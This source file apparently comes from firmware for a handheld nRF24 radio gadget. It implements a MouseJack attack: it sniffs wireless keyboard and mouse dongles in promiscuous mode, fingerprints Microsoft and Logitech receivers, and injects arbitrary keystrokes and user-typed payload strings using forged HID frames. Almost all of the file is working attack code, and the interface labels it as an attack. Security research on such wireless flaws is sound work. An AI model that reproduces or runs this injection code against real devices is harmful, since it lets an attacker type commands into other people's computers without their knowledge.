#include "mousejack_screen.h"
#include "screen_base.h"
#include "theme.h"
#include "views.h"
#include "menu_list.h"
#include "input_view.h"
#include "../config.h"
#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>
#include <lvgl.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// ── Constants ────────────────────────────────────────────────────────────────

#define MJ_MAX        5
#define MJ_SCAN_CHANS 83
#define MJ_TICK_CHANS 4
#define MJ_DWELL_US   300
#define MJ_ROW_H      19

// ── Radio (lazy-initialized, kept alive across pushes) ───────────────────────

static SPIClass g_nrf_spi(FSPI);
static RF24     g_nrf(NRF24_CE_PIN, NRF24_CSN_PIN);
static bool     g_nrf_ok = false;

// ── Target tracking ──────────────────────────────────────────────────────────

typedef enum { MJ_UNKNOWN = 0, MJ_MS, MJ_LG } MjVendor;

typedef struct {
    uint8_t  addr[5];
    MjVendor vendor;
    uint8_t  channel;
    uint32_t count;
} MjTarget;

static MjTarget g_targets[MJ_MAX];
static int      g_target_count = 0;

// ── CRC16-CCITT (poly 0x1021, init 0xFFFF) ───────────────────────────────────

static uint16_t mj_crc(const uint8_t *buf, int len) {
    uint16_t crc = 0xFFFF;
    for (int i = 0; i < len; i++) {
        uint8_t byte = buf[i];
        for (int b = 0; b < 8; b++) {
            bool bit = (byte >> 7) & 1;
            byte <<= 1;
            bool msb = (crc >> 15) & 1;
            crc <<= 1;
            if (bit ^ msb) crc ^= 0x1021;
        }
    }
    return crc;
}

// ── Bit-shift: shifts all bytes left by 1 using adjacent byte's MSB ──────────

static void mj_shift_left(const uint8_t *in, uint8_t *out, int len) {
    for (int i = 0; i < len; i++)
        out[i] = (in[i] << 1) | (i + 1 < 32 ? (in[i + 1] >> 7) : 0);
}

// ── Vendor fingerprint ───────────────────────────────────────────────────────

static MjVendor mj_fingerprint(const uint8_t *addr, const uint8_t *pay, uint8_t plen) {
    // Logitech Unifying: addr[4]==0, 2's-complement checksum in last payload byte
    if (addr[4] == 0x00 && plen >= 2) {
        uint8_t sum = 0;
        for (int i = 0; i < plen - 1; i++) sum += pay[i];
        if ((uint8_t)(~sum + 1) == pay[plen - 1]) return MJ_LG;
    }
    // Microsoft: HID report header 0x0A, typical payload size 19
    if (plen == 19 && pay[0] == 0x0A) return MJ_MS;
    if (plen == 19 || plen == 16)     return MJ_MS;
    return MJ_UNKNOWN;
}

// ── ESB frame parser (validates CRC-16, records unique addresses) ─────────────

static bool mj_try_frame(const uint8_t *buf, uint8_t ch) {
    // ESB layout: [5B addr][PCF 9 bits across 2 bytes][payload][2B CRC]
    uint8_t plen = (buf[5] >> 2) & 0x3F;
    if (plen > 32) return false;
    int flen = 5 + 1 + plen;   // addr + PCF lead byte + payload
    if (flen + 2 > 32) return false;

    uint16_t calc = mj_crc(buf, flen);
    uint16_t recv = ((uint16_t)buf[flen] << 8) | buf[flen + 1];
    if (calc != recv) return false;

    const uint8_t *addr = buf;
    const uint8_t *pay  = buf + 6;

    for (int i = 0; i < g_target_count; i++) {
        if (memcmp(g_targets[i].addr, addr, 5) == 0) {
            g_targets[i].count++;
            g_targets[i].channel = ch;
            return true;
        }
    }
    if (g_target_count >= MJ_MAX) return true;
    MjTarget *t = &g_targets[g_target_count++];
    memcpy(t->addr, addr, 5);
    t->channel = ch;
    t->count   = 1;
    t->vendor  = mj_fingerprint(addr, pay, plen);
    return true;
}

static void mj_process(const uint8_t *raw, uint8_t ch) {
    if (mj_try_frame(raw, ch)) return;
    // The NRF24 in promiscuous mode may misalign by 1 bit — try shifted copy
    uint8_t shifted[32];
    mj_shift_left(raw, shifted, 32);
    mj_try_frame(shifted, ch);
}

// ── Radio helpers ─────────────────────────────────────────────────────────────

static bool mj_radio_init(void) {
    if (g_nrf_ok) return true;
    g_nrf_spi.begin(NRF24_SCK_PIN, NRF24_MISO_PIN, NRF24_MOSI_PIN, -1);
    if (!g_nrf.begin(&g_nrf_spi)) return false;
    g_nrf_ok = true;
    return true;
}

static void mj_promisc_mode(void) {
    // 2-byte address 0xAAAA catches packets near preamble alignment
    static const uint8_t promisc_addr[2] = { 0xAA, 0xAA };
    g_nrf.setAutoAck(false);
    g_nrf.disableCRC();
    g_nrf.setAddressWidth(2);
    g_nrf.setDataRate(RF24_2MBPS);
    g_nrf.setPALevel(RF24_PA_LOW);
    g_nrf.setPayloadSize(32);
    g_nrf.openReadingPipe(0, promisc_addr);
    g_nrf.startListening();
}

// ── HID helpers ───────────────────────────────────────────────────────────────

static uint8_t ascii_to_hid(char c) {
    if (c >= 'a' && c <= 'z') return (uint8_t)(4  + (c - 'a'));
    if (c >= 'A' && c <= 'Z') return (uint8_t)(4  + (c - 'A'));
    if (c >= '1' && c <= '9') return (uint8_t)(30 + (c - '1'));
    switch (c) {
        case '0':  return 39;
        case ' ':  return 44;
        case '\n': return 40;
        case '.':  return 55;
        case ',':  return 54;
        case '-':  return 45;
        case '/':  return 56;
        case '=':  return 46;
        default:   return 0;
    }
}

static bool ascii_needs_shift(char c) {
    return c >= 'A' && c <= 'Z';
}

// ── Microsoft HID injection ───────────────────────────────────────────────────

static void inject_ms(const MjTarget *t, uint8_t hid, uint8_t mod) {
    // 19-byte HID report, XOR-encrypted with addr[4]
    uint8_t frame[19] = {};
    frame[0] = 0x0A;
    frame[1] = mod;
    frame[3] = hid;
    uint8_t key = t->addr[4];
    for (int i = 0; i < 19; i++) frame[i] ^= key;

    // TX address is device address reversed
    uint8_t tx_addr[5];
    for (int i = 0; i < 5; i++) tx_addr[i] = t->addr[4 - i];

    g_nrf.stopListening();
    g_nrf.setAutoAck(false);
    g_nrf.enableDynamicPayloads();
    g_nrf.setAddressWidth(5);
    g_nrf.openWritingPipe(tx_addr);

    g_nrf.write(frame, 19);             // key down
    delay(8);
    memset(frame, 0, 19);
    for (int i = 0; i < 19; i++) frame[i] ^= key;
    g_nrf.write(frame, 19);             // key up
    delay(8);
}

// ── Logitech Unifying HID injection ──────────────────────────────────────────

static void inject_lg(const MjTarget *t, uint8_t hid, uint8_t mod) {
    // 10-byte frame with 2's-complement checksum in byte 9
    uint8_t frame[10] = { 0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    frame[2] = mod;
    frame[4] = hid;
    uint8_t sum = 0;
    for (int i = 0; i < 9; i++) sum += frame[i];
    frame[9] = (uint8_t)(~sum + 1);

    g_nrf.stopListening();
    g_nrf.setAutoAck(false);
    g_nrf.setAddressWidth(5);
    g_nrf.setPayloadSize(10);
    g_nrf.openWritingPipe(t->addr);
    g_nrf.setChannel(t->channel);

    g_nrf.write(frame, 10);             // key down
    delay(8);
    // Key up: zero out keycodes, recalculate checksum
    memset(frame + 2, 0, 7);
    sum = 0;
    for (int i = 0; i < 9; i++) sum += frame[i];
    frame[9] = (uint8_t)(~sum + 1);
    g_nrf.write(frame, 10);             // key up
    delay(8);
}

static void inject_key(const MjTarget *t, uint8_t hid, uint8_t mod) {
    if (t->vendor == MJ_LG) inject_lg(t, hid, mod);
    else                     inject_ms(t, hid, mod);
}

static void inject_string(const MjTarget *t, const char *text) {
    for (int i = 0; text[i]; i++) {
        uint8_t hid = ascii_to_hid(text[i]);
        if (hid) inject_key(t, hid, ascii_needs_shift(text[i]) ? 0x02 : 0x00);
        delay(5);
    }
    inject_key(t, 0x28, 0x00);         // ENTER
}

// ── Scan context ──────────────────────────────────────────────────────────────

typedef struct {
    lv_obj_t   *status_lbl;
    lv_obj_t   *rows[MJ_MAX];
    lv_obj_t   *row_lbls[MJ_MAX];
    lv_timer_t *timer;
    int         sel;
    uint8_t     scan_ch;
    bool        scanning;
} ScanCtx;

static void scan_refresh_row(ScanCtx *ctx, int i) {
    lv_obj_clear_flag(ctx->rows[i], LV_OBJ_FLAG_HIDDEN);
    const MjTarget *t = &g_targets[i];
    const char *v = (t->vendor == MJ_MS) ? "MS" :
                    (t->vendor == MJ_LG)  ? "LG" : "??";
    char buf[48];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X %s ch%d",
             t->addr[0], t->addr[1], t->addr[2],
             t->addr[3], t->addr[4], v, t->channel);
    lv_label_set_text(ctx->row_lbls[i], buf);
}

static void scan_highlight(ScanCtx *ctx) {
    for (int i = 0; i < g_target_count; i++) {
        bool sel = (i == ctx->sel);
        lv_obj_set_style_bg_color(ctx->rows[i],
            sel ? theme_clr(CLR_ACCENT) : theme_clr(CLR_BG_LIGHT), 0);
        lv_obj_set_style_text_color(ctx->row_lbls[i],
            sel ? theme_clr(CLR_TEXT_DARK) : theme_clr(CLR_TEXT), 0);
    }
}

static void scan_timer_cb(lv_timer_t *t) {
    ScanCtx *ctx = (ScanCtx *)lv_timer_get_user_data(t);
    if (!ctx->scanning) return;

    int prev = g_target_count;
    for (int i = 0; i < MJ_TICK_CHANS; i++) {
        g_nrf.setChannel(ctx->scan_ch);
        g_nrf.startListening();
        delayMicroseconds(MJ_DWELL_US);
        if (g_nrf.available()) {
            uint8_t raw[32] = {};
            g_nrf.read(raw, 32);
            mj_process(raw, ctx->scan_ch);
        }
        ctx->scan_ch = (ctx->scan_ch + 1) % MJ_SCAN_CHANS;
    }

    char status[40];
    if (g_target_count > 0)
        snprintf(status, sizeof(status), "Scanning ch %d  |  %d found",
                 ctx->scan_ch, g_target_count);
    else
        snprintf(status, sizeof(status), "Scanning ch %d...", ctx->scan_ch);
    lv_label_set_text(ctx->status_lbl, status);

    if (g_target_count > prev) {
        for (int i = prev; i < g_target_count; i++) scan_refresh_row(ctx, i);
        scan_highlight(ctx);
    }
}

// ── Attack menu callbacks ─────────────────────────────────────────────────────

static void attack_inject_done(const char *text, void *user) {
    if (text && text[0]) {
        inject_string((const MjTarget *)user, text);
        mj_promisc_mode();
    }
}

static void attack_inject_text(void *user) {
    nav_push(input_view_create("Payload", "Type payload...", 64,
                               attack_inject_done, user));
}

static void attack_send_enter(void *user) {
    inject_key((const MjTarget *)user, 0x28, 0x00);
    mj_promisc_mode();
}

// ── Scan view button callbacks ────────────────────────────────────────────────

static void scan_on_up(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    if (!g_target_count) return;
    ctx->sel = (ctx->sel - 1 + g_target_count) % g_target_count;
    scan_highlight(ctx);
}

static void scan_on_down(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    if (!g_target_count) return;
    ctx->sel = (ctx->sel + 1) % g_target_count;
    scan_highlight(ctx);
}

static void scan_on_ok(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    if (!g_nrf_ok || !g_target_count) return;

    ctx->scanning = false;
    g_nrf.stopListening();

    MjTarget *t = &g_targets[ctx->sel];
    MenuItem items[2] = {
        { LV_SYMBOL_KEYBOARD, "Inject Text", nullptr, attack_inject_text, t },
        { LV_SYMBOL_PLAY,     "Send ENTER",  nullptr, attack_send_enter,  t },
    };
    char title[28];
    snprintf(title, sizeof(title), "Attack %02X:%02X:%02X",
             t->addr[0], t->addr[1], t->addr[2]);
    nav_push(list_view_create(title, items, 2));
}

static void scan_on_extra(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    g_target_count = 0;
    memset(g_targets, 0, sizeof(g_targets));
    ctx->scan_ch = 0;
    ctx->sel     = 0;
    for (int i = 0; i < MJ_MAX; i++) lv_obj_add_flag(ctx->rows[i], LV_OBJ_FLAG_HIDDEN);

    if (g_nrf_ok) {
        ctx->scanning = true;
        mj_promisc_mode();
        lv_label_set_text(ctx->status_lbl, "Scanning...");
    }
}

static bool scan_on_back(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    ctx->scanning = false;
    if (g_nrf_ok) g_nrf.stopListening();
    return false;
}

static void scan_on_destroy(AppView *v) {
    ScanCtx *ctx = (ScanCtx *)v->ctx;
    if (ctx->timer) lv_timer_delete(ctx->timer);
    free(ctx);
}

// ── Entry point ───────────────────────────────────────────────────────────────

AppView *mousejack_view_create(void) {
    g_target_count = 0;
    memset(g_targets, 0, sizeof(g_targets));

    AppView *v    = app_view_new();
    v->root       = screen_base_create("MOUSEJACK", true);
    v->on_up      = scan_on_up;
    v->on_down    = scan_on_down;
    v->on_ok      = scan_on_ok;
    v->on_back    = scan_on_back;
    v->on_extra   = scan_on_extra;
    v->on_destroy = scan_on_destroy;

    ScanCtx *ctx = (ScanCtx *)calloc(1, sizeof(ScanCtx));
    v->ctx       = ctx;

    bool hw_ok   = mj_radio_init();
    ctx->scanning = hw_ok;

    lv_obj_t *root = v->root;

    // Status label
    ctx->status_lbl = lv_label_create(root);
    lv_obj_set_pos(ctx->status_lbl, 4, SCREEN_CONTENT_TOP + 2);
    lv_obj_set_style_text_font(ctx->status_lbl, FONT_SMALL, 0);
    lv_obj_set_style_text_color(ctx->status_lbl,
        hw_ok ? theme_clr(CLR_TEXT_DIM) : theme_clr(CLR_WARNING), 0);
    lv_label_set_text(ctx->status_lbl,
        hw_ok ? "Scanning..." : "No NRF24 hardware detected");

    // Separator
    lv_obj_t *sep = lv_obj_create(root);
    lv_obj_set_pos(sep, 0, SCREEN_CONTENT_TOP + 14);
    lv_obj_set_size(sep, LCD_WIDTH, 1);
    lv_obj_set_style_bg_color(sep, theme_clr(CLR_SEPARATOR), 0);
    lv_obj_set_style_bg_opa(sep, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(sep, 0, 0);
    lv_obj_set_style_radius(sep, 0, 0);
    lv_obj_clear_flag(sep, LV_OBJ_FLAG_SCROLLABLE);

    // Pre-create MJ_MAX hidden device rows
    int y = SCREEN_CONTENT_TOP + 17;
    for (int i = 0; i < MJ_MAX; i++) {
        lv_obj_t *row = lv_obj_create(root);
        lv_obj_set_pos(row, 2, y);
        lv_obj_set_size(row, LCD_WIDTH - 4, MJ_ROW_H - 1);
        lv_obj_set_style_radius(row, 2, 0);
        lv_obj_set_style_border_width(row, 0, 0);
        lv_obj_set_style_pad_all(row, 0, 0);
        lv_obj_set_style_bg_opa(row, LV_OPA_COVER, 0);
        lv_obj_set_style_bg_color(row, theme_clr(CLR_BG_LIGHT), 0);
        lv_obj_add_flag(row, LV_OBJ_FLAG_HIDDEN);
        lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
        ctx->rows[i] = row;

        lv_obj_t *lbl = lv_label_create(row);
        lv_obj_set_style_text_font(lbl, FONT_SMALL, 0);
        lv_obj_set_style_text_color(lbl, theme_clr(CLR_TEXT), 0);
        lv_obj_align(lbl, LV_ALIGN_LEFT_MID, 4, 0);
        lv_label_set_text(lbl, "");
        ctx->row_lbls[i] = lbl;

        y += MJ_ROW_H;
    }

    // Hint at bottom
    lv_obj_t *hint = lv_label_create(root);
    lv_label_set_text(hint, "OK=attack  EXTRA=rescan");
    lv_obj_set_style_text_font(hint, FONT_SMALL, 0);
    lv_obj_set_style_text_color(hint, theme_clr(CLR_TEXT_DIM), 0);
    lv_obj_align(hint, LV_ALIGN_BOTTOM_LEFT, 4, -2);

    // Start scanning if hardware is present
    if (hw_ok) {
        mj_promisc_mode();
        ctx->timer = lv_timer_create(scan_timer_cb, 20, ctx);
    }

    return v;
}
